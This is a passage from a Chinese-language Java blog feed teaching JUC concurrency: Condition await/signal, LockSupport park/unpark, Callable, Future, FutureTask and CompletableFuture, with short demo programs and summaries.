class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"进入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                condition<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"被唤醒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                condition<span class="token punctuation">.</span><span class="token function">signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"发出通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h4><p>1、condition必须包裹在lock和unlock之前</p><p>2、顺序性一定保证await后signal，否则无效</p><h3 id="LockSupport"><a href="#LockSupport" class="headerlink" title="LockSupport"></a>LockSupport</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">LockSupport</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LockSupportDemo3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Thread</span> t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"进入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">park</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"被唤醒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">LockSupport</span><span class="token punctuation">.</span><span class="token function">unpark</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"发出通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"t2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>总结：</p><p>不用包在锁块，减低死锁发生的可能性</p><p>不用保证顺序</p><p><strong>注意：unpark只有一次上限为1 如果多次unpark，最多只为1，因为上限为1，此时如果park多次则无法执行后续代码(at most 1,at least 0)</strong></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(二)-CompletableFuture</title>
    <link href="/posts/918a696d.html"/>
    <url>/posts/918a696d.html</url>
    
    <content type="html"><![CDATA[<p> 了解JUC的概念，学习并找我CompletableFuture的使用及其应用场景</p><span id="more"></span><h2 id="什么是JUC"><a href="#什么是JUC" class="headerlink" title="什么是JUC"></a>什么是JUC</h2><p>J.U.C并发包，即<code>java.util.concurrent</code>包，是JDK的核心工具包，是JDK1.5之后，由 Doug Lea实现并引入。</p><p>整个<code>java.util.concurrent</code>包，按照功能可以大致划分如下：</p><ul><li>juc-locks 锁框架</li><li>juc-atomic 原子类框架</li><li>juc-sync 同步器框架</li><li>juc-collections 集合框架</li><li>juc-executors 执行器框架</li></ul><h2 id="CompletableFuture"><a href="#CompletableFuture" class="headerlink" title="CompletableFuture"></a>CompletableFuture</h2><h3 id="Callable接口与Runnable接口"><a href="#Callable接口与Runnable接口" class="headerlink" title="Callable接口与Runnable接口"></a>Callable接口与Runnable接口</h3><blockquote><p><code>Callable</code>接口类似于<a href="https://blog.csdn.net/java/lang/Runnable.html"><code>Runnable</code></a> ，因为它们都是为其实例可能由另一个线程执行的类设计的。 然而，<code>Runnable</code>不返回结果，也不能抛出被检查的异常。具体区别如下</p></blockquote><ol><li>Callable功能更强大些。</li><li>相比run()方法，可以有返回值。</li><li>方法可以抛出异常。</li><li>支持泛型的返回值。</li><li>需要借助FutureTask类，比如获取返回结果。</li></ol><h3 id="Future-接口"><a href="#Future-接口" class="headerlink" title="Future 接口"></a>Future 接口</h3><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">public interface Future&lt;V&gt; &#123;&#x2F;&#x2F;尝试取消执行此任务。    boolean cancel(boolean mayInterruptIfRunning);&#x2F;&#x2F;如果此任务在正常完成之前被取消，则返回 true 。    boolean isCancelled();&#x2F;&#x2F;返回 true如果任务已完成。    boolean isDone();&#x2F;&#x2F;等待计算完成，然后检索其结果    V get() throws InterruptedException, ExecutionException;&#x2F;&#x2F;如果需要等待最多在给定的时间计算完成，然后检索其结果（如果可用）    V get(long timeout, TimeUnit unit)        throws InterruptedException, ExecutionException, TimeoutException;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Future接口用于对异步任务的执行结果进行取消、查询是 否完成、获取结果等</p><h3 id="FutureTask"><a href="#FutureTask" class="headerlink" title="FutureTask"></a>FutureTask</h3><blockquote><p>FutureTask是Future的实现，可用于包装<a href="https://blog.csdn.net/java/util/concurrent/Callable.html"><code>Callable</code></a>或<a href="https://blog.csdn.net/java/lang/Runnable.html"><code>Runnable</code></a>对象,提交给Thread执行，这样就可以使用FutureTask执行一些Feture的特性方法</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Callable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutionException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">FutureTask</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">class</span> <span class="token class-name">CookDinner</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正在做第"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"份饭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">50</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureTaskDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">CookDinner</span> cookDinner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CookDinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> futureTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>cookDinner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">)</span><span class="token punctuation">;</span>        thread<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"thread1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Integer</span> integer <span class="token operator">=</span> futureTask<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"总共做了"</span><span class="token operator">+</span>integer<span class="token operator">+</span><span class="token string">"份饭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExecutionException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="总结FutureTask"><a href="#总结FutureTask" class="headerlink" title="总结FutureTask"></a>总结FutureTask</h4><p>优点：可以包装异步任务，拿到执行结果</p><p>缺点：get方法，会阻塞，就失去了并发的特性，变成同步方法</p><p>使用总结：实际使用是尽量<strong>不要阻塞</strong>，采用get(long timeout, TimeUnit unit)，带<strong>超时时间</strong>，并且<strong>放在最后</strong>，但这种本质上只是算一种减轻，并不是算替代。</p><p>更好的方式是采用轮询方式，CompletableFuture</p><h3 id="CompletableFuture-1"><a href="#CompletableFuture-1" class="headerlink" title="CompletableFuture"></a>CompletableFuture</h3><p>CompletableFuture是对Future的改进</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">implements</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">,</span> <span class="token class-name">CompletionStage</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h4 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h4><p>CompletionStage介绍：是Java8新增得一个接口，用于异步执行中的阶段处理，代表异步计算中的一个阶段或步骤</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadPoolExecutor</span> threadPoolExecutor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1L</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LinkedBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">defaultThreadFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor<span class="token punctuation">.</span>AbortPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">></span></span> future1 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">runAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"异步执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">></span></span> future2 <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">runAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"异步执行2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>threadPoolExecutor<span class="token punctuation">)</span><span class="token punctuation">;</span>        threadPoolExecutor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>基本写法，是继承了Future 的特性，所以此时调用Future.get 同样会阻塞主线程</p><h4 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h4><p> 应对Future的完成回调功能</p><p>当多个一步计算互相独立，同时第二个任务又依赖第一个的结果时</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>juc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/6/18 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadPoolExecutor</span> threadPoolExecutor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1L</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LinkedBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">defaultThreadFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor<span class="token punctuation">.</span>AbortPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenApply</span><span class="token punctuation">(</span>fn <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> fn <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"结果"</span> <span class="token operator">+</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exceptionally</span><span class="token punctuation">(</span>e <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        threadPoolExecutor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main 结束"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 前面是守护线程,保证前面线程结果执行完</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> 